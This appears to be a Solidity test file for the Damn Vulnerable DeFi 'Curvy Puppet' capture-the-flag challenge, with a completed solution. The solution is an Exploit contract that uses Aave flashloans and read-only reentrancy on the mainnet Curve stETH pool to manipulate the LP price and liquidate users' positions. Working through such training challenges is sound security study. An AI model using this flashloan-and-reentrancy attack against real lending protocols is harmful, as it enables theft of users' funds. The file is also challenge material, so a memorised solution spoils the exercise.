// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

         startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }


    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        IERC20 curveLpToken = IERC20(curvePool.lp_token());

        Exploit exploit = new Exploit(lending, address(treasury), dvt);
        console.log("--- [CHEAT] Add 10ether, too lazy to borrow Balancer ---");
        deal(address(weth), address(exploit), 10 ether);

        // Transfer LP tokens and WETH to the exploit contract
        curveLpToken.transferFrom(address(treasury), address(exploit), TREASURY_LP_BALANCE);
        weth.transferFrom(address(treasury), address(exploit), TREASURY_WETH_BALANCE);
        
        exploit.executeExploit();    
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}
interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}
interface IBalancerVault {

    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

}
contract Exploit {
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));    
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IAaveFlashloan constant AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    CurvyPuppetLending public lending;
    address treasury;
    DamnValuableToken dvt;
    IERC20 public curveLpToken;

    constructor(
        CurvyPuppetLending _lending,
        address _treasury,
        DamnValuableToken _dvt
    ) {
        lending = _lending;
        treasury = _treasury;
        dvt = _dvt;
        curveLpToken = IERC20(curvePool.lp_token());
    }

    function executeExploit() public {
        console.log("=== Start Exploit ===");        

        console.log("--- Step 1: Set Approvals ---");
        curveLpToken.approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: address(curveLpToken),
            spender: address(lending),
            amount: type(uint160).max,
            expiration: uint48(block.timestamp)
        });
        
        stETH.approve(address(AaveV2), type(uint256).max);
        weth.approve(address(AaveV2), type(uint256).max);

        console.log("--- Step 2: Initiate Aave Flashloan ---");
        
        console.log("Balances BEFORE Flashloan:");
        console.log("  WETH:", weth.balanceOf(address(this)));
        console.log("  stETH:", stETH.balanceOf(address(this)));

        address[] memory assets = new address[](2);
        assets[0] = address(stETH);
        assets[1] = address(weth);
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 172000 * 1e18; 
        amounts[1] = 58491 * 1e18;  
        
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
 
        console.log("Borrowing from Aave: 172000 stETH & 58491 WETH...");
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
        
        console.log("--- Step 7: Final Cleanup & Return Funds ---");
        console.log("Treasury Recovery:");
        console.log("  WETH returning:", weth.balanceOf(address(this)));
        console.log("  LP returning:", uint256(1));
        console.log("  DVT returning:", uint256(7500e18));

        weth.transfer(treasury, weth.balanceOf(address(this)));
        curveLpToken.transfer(treasury, 1); 
        dvt.transfer(treasury, 7500e18);
        console.log("=== Exploit Completed ===");
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address,
        bytes memory
    ) external returns (bool) {
        console.log("Aave Flashloan Received.");
        console.log("Balances AFTER Flashloan:");
        console.log("  WETH:", weth.balanceOf(address(this)));
        console.log("  stETH:", stETH.balanceOf(address(this)));

        _performCurveAttack();
        _performSwapAndRepay(assets, amounts, premiums);
        
        return true;
    }

    function _performCurveAttack() internal {
        console.log("--- Step 3: Manipulate Curve Pool (Add Liquidity) ---");
        weth.withdraw(58685 ether);
        stETH.approve(address(curvePool), type(uint256).max);

        uint256[2] memory addAmounts;
        addAmounts[0] = 58685 ether; 
        addAmounts[1] = stETH.balanceOf(address(this)); 
        
        console.log("Adding Liquidity to Curve...");
        curvePool.add_liquidity{value: 58685 ether}(addAmounts, 0);
        console.log("LP token price after add liquidity:", curvePool.get_virtual_price());

        console.log("--- Step 4: Remove Liquidity & Trigger Reentrancy ---");
        uint256 burnAmount = curveLpToken.balanceOf(address(this)) - 3000000000000000001; 
        uint256[2] memory min_amounts;
        curvePool.remove_liquidity(burnAmount, min_amounts);  
        console.log("Exited remove_liquidity. Reentrancy logic over.");
    }

    function _performSwapAndRepay(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums
    ) internal {
        console.log("--- Step 6: Asset Swap & Repay Flashloan ---");
        console.log("Current LP Virtual Price:", curvePool.get_virtual_price());
        console.log("Exchange Rate (1 ETH -> stETH):", curvePool.get_dy(0, 1, 1 ether));
        
        uint256 stEthDebt = amounts[0] + premiums[0];
        if (stETH.balanceOf(address(this)) < stEthDebt) {
            uint256 ethAmount = 12963923469069977697655; 
            console.log("  Swapping ETH for stETH on Curve:", ethAmount);
            curvePool.exchange{value: ethAmount}(0, 1, ethAmount, 1);
        }

        if (address(this).balance > 0) {
            console.log("  Wrapping remaining ETH to WETH:", address(this).balance);
            weth.deposit{value: address(this).balance}();
        }

        for (uint256 i = 0; i < assets.length; i++) {
            IERC20(assets[i]).approve(msg.sender, amounts[i] + premiums[i]);
        }
    }

    receive() external payable {
         if (msg.sender == address(curvePool)) {
            console.log("--- Step 5: Readonly Reentrancy ---");
            console.log("Current LP Virtual Price:", curvePool.get_virtual_price());
            
            address[3] memory users = [
                0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,  // Alice
                0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,  // Bob
                0xea475d60c118d7058beF4bDd9c32bA51139a74e0   // Charlie
            ];
            
            for (uint256 i = 0; i < users.length; i++) {
                lending.liquidate(users[i]);
            }
            console.log("Liquidation sequence complete.");
         }
    }
}